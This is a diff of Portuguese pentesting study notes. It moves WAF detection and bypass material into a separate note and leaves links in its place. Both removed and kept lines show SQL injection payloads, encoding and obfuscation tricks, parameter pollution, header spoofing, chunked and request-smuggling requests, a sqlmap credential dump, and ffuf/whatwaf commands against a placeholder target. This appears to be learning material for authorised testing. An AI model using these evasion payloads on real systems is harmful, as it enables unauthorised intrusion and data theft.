@@ -1464,204 +1464,10 @@ sqlmap -u "http://ALVO.COM/page?id=1" -D BANCO -T TABELA -C user,password --dump
 
 # 🛡️ WAF Bypass — Contornando Web Application Firewalls
 
-> **O que é WAF:** Um Web Application Firewall é uma camada de segurança que filtra, monitora e bloqueia requisições HTTP maliciosas antes que elas cheguem à aplicação. WAFs podem ser baseados em **regex** (padrões de texto), **assinatura** (payloads conhecidos), **heurística** (comportamento anômalo) ou **machine learning**.
-
-> **Por que aprender WAF Bypass:** Em ambientes reais e em CTFs avançados, você vai encontrar WAFs como **ModSecurity**, **Cloudflare**, **AWS WAF**, **Akamai**, **Imperva**, **Sucuri**, **Fortinet FortiWeb** entre outros. Saber contorná-los é essencial para pentesting.
-
----
-
-## 🔎 Detecção de WAF
-
-> Antes de tentar bypass, identifique **se** e **qual** WAF está presente.
-
-### Sinais de que há um WAF
-```
-- Resposta HTTP 403 Forbidden ao enviar payloads simples como ' OR 1=1 --
-- Página de bloqueio customizada ("Request Blocked", "Access Denied", "Forbidden")
-- Headers de resposta específicos: X-Sucuri-ID, CF-Ray (Cloudflare), X-CDN (Akamai)
-- Status codes incomuns: 406, 419, 429, 503
-- Cookie de WAF na resposta (ex: __cfduid, visid_incap_, etc.)
-```
-
-### Ferramentas de detecção
-```bash
-# wafw00f — Identifica WAF automaticamente
-pip install wafw00f
-wafw00f http://ALVO.COM
-
-# Nmap WAF detection
-nmap -p 80,443 --script http-waf-detect ALVO.COM
-nmap -p 80,443 --script http-waf-fingerprint ALVO.COM
-
-# Curl manual — Enviar payload e observar resposta
-curl -s -o /dev/null -w "%{http_code}" "http://ALVO.COM/?id=' OR 1=1 --"
-# Se retornar 403/406/503 → provável WAF
-
-# Verificar headers
-curl -I http://ALVO.COM
-# Procurar: Server, X-Powered-By, X-CDN, CF-Ray, X-Sucuri-ID, etc.
-```
-
----
-
-## 🧠 Técnicas Genéricas de Bypass (aplicam-se a QUALQUER vetor)
-
-> Essas técnicas servem para SQLi, XSS, LFI, Command Injection — qualquer payload bloqueado por WAF.
-
-### 1. Encoding e Obfuscação
-
-```
-# URL Encoding (simples)
-' OR 1=1 --   →   %27%20OR%201%3D1%20--
-
-# Double URL Encoding (o servidor decodifica duas vezes)
-' OR 1=1 --   →   %2527%2520OR%25201%253D1%2520--
-
-# Triple Encoding (quando há múltiplas camadas de decode)
-%25252527
-
-# Unicode / UTF-8 Encoding
-' → %C0%A7  ou  %EF%BC%87 (fullwidth apostrophe)
-< → %EF%BC%9C
-> → %EF%BC%9E
-/ → %C0%AF  ou  %E0%80%AF
-
-# HTML Entity Encoding
-< → &lt;  ou  &#60;  ou  &#x3C;
-> → &gt;  ou  &#62;  ou  &#x3E;
-' → &#39;  ou  &#x27;
-" → &quot;  ou  &#34;
-
-# Hex Encoding
-' → 0x27
-admin → 0x61646d696e
-
-# Octal Encoding
-/etc/passwd → /\145\164\143/\160\141\163\163\167\144
-
-# Base64 (útil para payloads inteiros)
-echo -n "cat /etc/passwd" | base64
-# Y2F0IC9ldGMvcGFzc3dk
-```
-
-### 2. Manipulação de Espaços em Branco
-
-```
-# Substituir espaço por caracteres alternativos
-ESPAÇO → %09 (TAB horizontal)
-ESPAÇO → %0A (newline / line feed)
-ESPAÇO → %0B (TAB vertical)
-ESPAÇO → %0C (form feed)
-ESPAÇO → %0D (carriage return)
-ESPAÇO → %A0 (non-breaking space)
-ESPAÇO → %20 (espaço URL-encoded — às vezes o WAF filtra espaço literal mas não %20)
-ESPAÇO → /**/ (comentário SQL inline)
-ESPAÇO → + (em query strings)
-
-# Exemplos práticos (SQL)
-'%09UNION%09SELECT%091,2,3--
-'/**/UNION/**/SELECT/**/1,2,3--
-'+UNION+SELECT+1,2,3--
-```
-
-### 3. Fragmentação e Case Variation
-
-```
-# Alternar entre maiúsculas e minúsculas
-UNION SELECT  →  uNiOn SeLeCt
-SELECT        →  SeLeCt
-SCRIPT        →  ScRiPt
-
-# Inserir comentários no meio de palavras-chave (SQL)
-UNION → UN/**/ION
-SELECT → SEL/**/ECT
-UN/**/ION/**/SEL/**/ECT/**/1,2,3--
-
-# Inserir caracteres nulos
-UNI%00ON SEL%00ECT
-```
-
-### 4. HTTP Parameter Pollution (HPP)
-
-> Enviar o mesmo parâmetro múltiplas vezes. Diferentes servidores/frameworks processam de formas diferentes.
-
-```
-# O WAF pode analisar apenas o primeiro valor, mas a aplicação usa o último
-?id=1&id=' UNION SELECT 1,2,3--
-
-# Ou vice-versa — o WAF analisa o último, a aplicação usa o primeiro
-?id=' UNION SELECT 1,2,3--&id=1
-
-# Dividir o payload entre parâmetros duplicados
-# PHP/Apache usa o último; IIS/ASP concatena; JSP usa o primeiro
-?id=1 UNION/*&id=*/SELECT/*&id=*/1,2,3--
-```
-
-### 5. Alteração de Método HTTP e Content-Type
-
-```bash
-# Trocar método HTTP (alguns WAFs só filtram GET)
-# Converter GET para POST
-curl -X POST http://ALVO.COM/page -d "id=' UNION SELECT 1,2,3--"
-
-# Trocar Content-Type (alguns WAFs só analisam application/x-www-form-urlencoded)
-curl -X POST http://ALVO.COM/page \
-  -H "Content-Type: application/json" \
-  -d '{"id": "'"'"' UNION SELECT 1,2,3--"}'
-
-# Usar multipart/form-data
-curl -X POST http://ALVO.COM/page \
-  -F "id=' UNION SELECT 1,2,3--"
-
-# Usar charset diferente no Content-Type
-Content-Type: application/x-www-form-urlencoded; charset=ibm037
-# Encode o payload no charset especificado
-```
-
-### 6. Abuso de Headers HTTP
-
-```bash
-# Adicionar headers que alguns WAFs usam para whitelist (fingir ser interno)
-X-Forwarded-For: 127.0.0.1
-X-Real-IP: 127.0.0.1
-X-Originating-IP: 127.0.0.1
-X-Custom-IP-Authorization: 127.0.0.1
-X-Remote-IP: 127.0.0.1
-X-Client-IP: 127.0.0.1
-X-Host: 127.0.0.1
-True-Client-IP: 127.0.0.1
-
-# Exemplo com curl
-curl http://ALVO.COM/?id=1' -H "X-Forwarded-For: 127.0.0.1"
-```
-
-### 7. Chunked Transfer Encoding
-
-> Dividir o payload em chunks para evitar que o WAF analise o payload inteiro.
-
-```bash
-# Enviar requisição com Transfer-Encoding: chunked
-curl -X POST http://ALVO.COM/page \
-  -H "Transfer-Encoding: chunked" \
-  --data-binary $'4\r\nid=1\r\n7\r\n UNION \r\n8\r\nSELECT \r\n5\r\n1,2,3\r\n0\r\n\r\n'
-```
-
-### 8. Request Smuggling (Técnica Avançada)
-
-> Explorar diferenças entre como o WAF/proxy e o backend parseiam o body de uma requisição.
-
-```
-# CL.TE (Content-Length vs Transfer-Encoding)
-POST / HTTP/1.1
-Host: ALVO.COM
-Content-Length: 44
-Transfer-Encoding: chunked
-
-0
-
-GET /admin HTTP/1.1
-X-Ignore: X
-```
+> Metodologia, camadas de evasão e tamper scripts → [[WAF Bypass]] (fonte única).
+> Detecção de WAF, técnicas genéricas (encoding, whitespace, fragmentação, HPP,
+> método/Content-Type, headers, chunked, smuggling) e checklist vivem na nota
+> canônica. Abaixo, só payloads por vetor.
 
 ---
 
@@ -2318,23 +2124,10 @@ mv imagem_real.jpg shell.php.jpg
 
 ## 🧰 Ferramentas para WAF Bypass
 
-### Detecção e Identificação
+> Tampers do sqlmap, combinações por WAF e flags → [[WAF Bypass]] (seção SQLMap Tamper Scripts).
+> Ferramentas payload-adjacentes mantidas aqui:
 
 ```bash
-# wafw00f — Fingerprint de WAF
-wafw00f http://ALVO.COM
-wafw00f http://ALVO.COM -a  # Testar todos os WAFs possíveis
-
-# Nmap WAF scripts
-nmap -p 80,443 --script http-waf-detect,http-waf-fingerprint ALVO.COM
-```
-
-### Bypass automatizado
-
-```bash
-# SQLMap com tampers (já coberto acima)
-sqlmap -u URL --tamper=... --random-agent
-
 # Bypass-Url-Parser — Testa múltiplas representações de URL
 # https://github.com/laluka/bypass-url-parser
 python3 bypass-url-parser.py -u http://ALVO.COM/admin
@@ -2342,25 +2135,11 @@ python3 bypass-url-parser.py -u http://ALVO.COM/admin
 # WhatWaf — Detecta e tenta bypass automático
 # https://github.com/Ekultek/WhatWaf
 whatwaf -u "http://ALVO.COM/?id=1"
-```
 
-### Fuzzing de Bypass
-
-```bash
-# Usar ffuf/wfuzz com wordlists de WAF bypass
-# Wordlists recomendadas (SecLists):
-# /usr/share/seclists/Fuzzing/SQLi/
-# /usr/share/seclists/Fuzzing/XSS/
-# /usr/share/seclists/Fuzzing/LFI/
-
-# Exemplo: fuzzar payloads de SQLi contra WAF
+# Fuzzing de bypass com SecLists
 ffuf -u "http://ALVO.COM/page?id=FUZZ" \
   -w /usr/share/seclists/Fuzzing/SQLi/Generic-SQLi.txt \
   -fc 403 -mc 200
-
-# Wfuzz filtrando respostas bloqueadas
-wfuzz -c -z file,/usr/share/seclists/Fuzzing/SQLi/Generic-SQLi.txt \
-  --hc 403 "http://ALVO.COM/page?id=FUZZ"
 ```
 
 ### Burp Suite Extensions
@@ -2372,29 +2151,10 @@ wfuzz -c -z file,/usr/share/seclists/Fuzzing/SQLi/Generic-SQLi.txt \
 # Param Miner — Descobre parâmetros e headers escondidos (útil para HPP)
 ```
 
----
-
 ## 📋 Metodologia de WAF Bypass — Checklist
 
-```
-1. [ ] Identificar se existe WAF (wafw00f, headers, comportamento)
-2. [ ] Identificar qual WAF (Cloudflare, ModSecurity, AWS WAF, etc.)
-3. [ ] Testar payload básico e observar resposta de bloqueio
-4. [ ] Tentar encoding simples (URL encode, double encode)
-5. [ ] Tentar manipulação de espaços (/**/, %09, %0a)
-6. [ ] Tentar case variation (SeLeCt, UnIoN)
-7. [ ] Tentar fragmentação de keywords (UN/**/ION, SE/**/LECT)
-8. [ ] Tentar método HTTP alternativo (GET→POST, POST→PUT)
-9. [ ] Tentar Content-Type alternativo (json, multipart)
-10. [ ] Tentar HTTP Parameter Pollution
-11. [ ] Tentar headers de bypass (X-Forwarded-For: 127.0.0.1)
-12. [ ] Tentar chunked transfer encoding
-13. [ ] Tentar payloads específicos do banco/tecnologia
-14. [ ] Usar SQLMap com tampers + random-agent + delay
-15. [ ] Se tudo falhar: request smuggling, DNS rebinding
-```
-
-> **Regra de ouro:** Comece pelo bypass mais simples (encoding) e vá escalando a complexidade. Cada WAF tem fraquezas diferentes — o que funciona no ModSecurity pode não funcionar no Cloudflare e vice-versa. Teste, observe, adapte.
+> Checklist completo e regras de ouro → [[WAF Bypass]] (seção A Mentalidade do WAF Bypass).
+> Resumo: detectar → identificar o WAF → escalar do encoding simples ao smuggling.
 
 ---
 
